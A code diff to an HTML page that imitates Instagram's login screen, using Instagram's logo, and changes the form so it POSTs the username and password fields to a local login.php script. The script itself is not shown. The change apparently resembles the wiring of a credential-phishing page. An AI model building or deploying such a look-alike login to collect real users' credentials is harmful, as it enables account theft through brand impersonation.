@@ -12,10 +12,10 @@
     <div class="login-box">
       <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png" alt="Instagram" class="logo"/>
 
-      <form>
-        <input type="text" placeholder="Phone number, username, or email" />
-        <input type="password" placeholder="Password" />
-        <button type="submit">Log In</button>
+      <form action="login.php" method="POST">
+        <input type="text" name="username" placeholder="Phone number, username, or email" />
+        <input type="password" name="pass" placeholder="Password" />
+        <button type="submit" name="login">Log In</button>
       </form>
 
       <div class="divider">
@@ -32,5 +32,6 @@
       <p>Don't have an account? <a href="#">Sign up</a></p>
     </div>
   </div>
+  
 </body>
 </html>
